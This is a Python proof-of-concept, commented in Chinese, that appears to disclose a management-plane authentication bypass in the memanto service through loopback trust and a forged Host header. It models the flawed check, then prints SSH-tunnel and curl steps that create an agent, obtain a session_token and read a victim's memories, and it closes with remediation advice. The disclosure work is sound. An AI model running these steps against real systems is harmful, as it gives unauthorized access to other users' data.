#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC #3 — 管理面认证绕过：loopback 信任 + 攻击者可控 Host 头
=============================================================

对应漏洞（真实代码行号）：
  - memanto/app/routes/auth_deps.py:193-199 —— 管理面访问的三重条件：
        client.host 是 loopback
        AND Host 头是 loopback
        AND 非跨站浏览器请求
  - memanto/app/routes/auth_deps.py:133-144 —— "跨站浏览器请求"仅由
        Origin / Sec-Fetch-Site 两个请求方可控的头决定（非浏览器客户端
        直接不发送，天然通过）
  - memanto/app/config.py:144 —— 默认 HOST="0.0.0.0"
  - memanto/app/routes/sessions.py:206-248 —— activate 直接把含
        session_token 的完整 Session 返回给管理面调用者

结论：一旦任何"本机套接字"能到达服务（SSH 端口转发 / 本机反代 /
同机多用户进程 / 同机网页），无需任何 API key 即可：
   创建 agent → 激活 session → 拿到 session_token → 读写全部记忆。

本脚本 1:1 复刻 auth_deps.py 的三重判定逻辑，演示以下请求的判定结果：
  (a) 本机普通进程直接访问                     → 授予（设计如此）
  (b) 经 SSH -L 端口转发的远程攻击者（client.host=127.0.0.1，
      Host 头由攻击者控制为 127.0.0.1，无 Origin/Sec-Fetch-Site） → 授予  <<< 缺陷
  (c) 直连公网/局域网的远程攻击者             → 拒绝（正确）

注意：本脚本只测试授权判定谓词本身，不模拟 TCP 隧道行为——
(b) 场景的判定输入与 (a) 完全相同，这正是判定无法区分两者的原因。
(b) 的前置条件：攻击者须已持有受害主机的认证访问（SSH 账户/密钥）；
同机反代场景的前置条件：受害主机已配置反向代理把外部路由转发到
127.0.0.1:8000。
"""

import ipaddress
from urllib.parse import urlsplit


# ---------------------------------------------------------------------------
# 1:1 复刻 memanto/app/routes/auth_deps.py:93-144
# ---------------------------------------------------------------------------
def _is_loopback_host(host):
    if not host:
        return False
    try:
        addr = ipaddress.ip_address(host)
    except ValueError:
        return False
    if addr.is_loopback:
        return True
    ipv4_mapped = getattr(addr, "ipv4_mapped", None)
    return ipv4_mapped is not None and ipv4_mapped.is_loopback


def _is_loopback_host_header(host):
    if not host or not isinstance(host, str):
        return False
    try:
        hostname = urlsplit(f"//{host}").hostname
    except ValueError:
        return False
    return hostname == "localhost" or _is_loopback_host(hostname)


def _is_loopback_origin(origin):
    if not origin or not isinstance(origin, str):
        return False
    try:
        parsed = urlsplit(origin)
    except ValueError:
        return False
    if parsed.scheme not in {"http", "https"}:
        return False
    return parsed.hostname == "localhost" or _is_loopback_host(parsed.hostname)


def _is_cross_site_browser_request(origin, sec_fetch_site):
    if origin is not None and isinstance(origin, str):
        return not _is_loopback_origin(origin)
    fetch_site = (sec_fetch_site or "").strip().lower()
    return fetch_site in {"cross-site", "same-site"}


def require_management_access(client_host, host_header, origin, sec_fetch_site):
    """复刻 auth_deps.py:193-199 的 loopback 分支（credential 分支省略）。"""
    if (
        _is_loopback_host(client_host)
        and _is_loopback_host_header(host_header)
        and not _is_cross_site_browser_request(origin, sec_fetch_site)
    ):
        return "GRANTED (loopback trust)"
    return "DENIED"


# ---------------------------------------------------------------------------
# 攻击场景（只测判定谓词；各场景的判定输入标注了前置条件）
# ---------------------------------------------------------------------------
def main():
    print("=" * 72)
    print("PoC #3: 管理面认证绕过 —— loopback 信任 + 可伪造 Host 头")
    print("=" * 72)

    cases = [
        (
            "本机任意进程（无任何凭证）",
            "127.0.0.1", "127.0.0.1:8000", None, None,
        ),
        (
            # 与上一行判定输入完全相同——SSH 转发后 uvicorn 看到的对端
            # 就是 loopback，谓词无法区分两者（本脚本只测谓词，不模拟隧道）。
            # 前置条件：攻击者已持有受害主机认证访问（SSH 账户/密钥）。
            "SSH -L 端口转发的远程攻击者",
            "127.0.0.1", "127.0.0.1:8000", None, None,
        ),
        (
            # 前置条件：受害主机已配置反向代理把外部路由转发到 127.0.0.1:8000。
            "同机反向代理(nginx)后转发的远程攻击者",
            "127.0.0.1", "127.0.0.1", None, None,
        ),
        (
            "直连局域网端口的远程攻击者",
            "192.168.1.50", "192.168.1.10:8000", None, None,
        ),
        (
            "恶意网页(evil.com)上的浏览器 JS (DNS rebinding)",
            "127.0.0.1", "127.0.0.1:8000", "https://evil.com", "cross-site",
        ),
    ]

    for label, client_host, host_header, origin, sec_fetch in cases:
        decision = require_management_access(
            client_host, host_header, origin, sec_fetch
        )
        print(f"\n  {label:38s} -> {decision}")

    print("""
[解释]
  - 三重判定中，client.host 之外的两项（Host 头、Origin/Sec-Fetch-Site）
    对非浏览器客户端完全由请求方控制。SSH 转发/本机反代场景下，
    uvicorn 看到的 TCP 对端是 127.0.0.1——注意：使对端呈现为 loopback
    的是"转发/代理机制"，而不是服务端绑定 0.0.0.0；绑定 0.0.0.0 只决定
    端口对外可达，两者叠加才构成完整攻击路径。
  - 拿到管理权限后（sessions.py:206-248），配合 PoC #1 的"重建接管"：
        POST /api/v2/agents/alice          -> 用受害者的 agent_id 重建
                                             （远端 namespace 被收养）
        POST /api/v2/agents/alice/activate -> 响应体直接返回 session_token
        然后带 X-Session-Token 对 /agents/alice/recall 读写记忆
        （enforce_session_scope 只比对 agent_id 字符串，全程一致，放行）。

[实机验证步骤]（在装有 memanto 的机器上；前置：攻击者已持有受害主机
 认证访问，服务端默认 0.0.0.0:8000，alice 为已删除的受害者 agent）：
  1. 攻击机:  ssh -L 8000:127.0.0.1:8000 user@victim-host
  2. 攻击机:  curl -s -X POST http://127.0.0.1:8000/api/v2/agents \\
                 -H "Host: 127.0.0.1" -H "Content-Type: application/json" \\
                 -d '{"agent_id":"alice","pattern":"tool"}'
             -> 无任何凭证即创建成功（namespace 被收养，见 PoC #1）
  3. 攻击机:  curl -s -X POST http://127.0.0.1:8000/api/v2/agents/alice/activate \\
                 -H "Host: 127.0.0.1"
             -> 响应体包含 session_token
  4. 攻击机:  curl -s -X POST http://127.0.0.1:8000/api/v2/agents/alice/recall \\
                 -H "Host: 127.0.0.1" -H "X-Session-Token: <token>" \\
                 -H "Content-Type: application/json" -d '{"query":"*"}'
             -> 读回受害者 alice 的记忆（session scope 校验一致放行）

[修复建议]
  - 管理面不再以"TCP 对端为 loopback"作为授权依据，改为强制要求
    管理凭证（MEMANTO_SECRET_KEY / 管理 token），或仅在显式声明
    "single-user desktop" 模式且监听 127.0.0.1 时启用 loopback 信任；
  - 校验 X-Forwarded-For 前必须先信任代理并配置可信代理链
    （uvicorn --proxy-headers + forwarded-allow-ips），否则反代部署
    全部退化成本题场景。
""")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
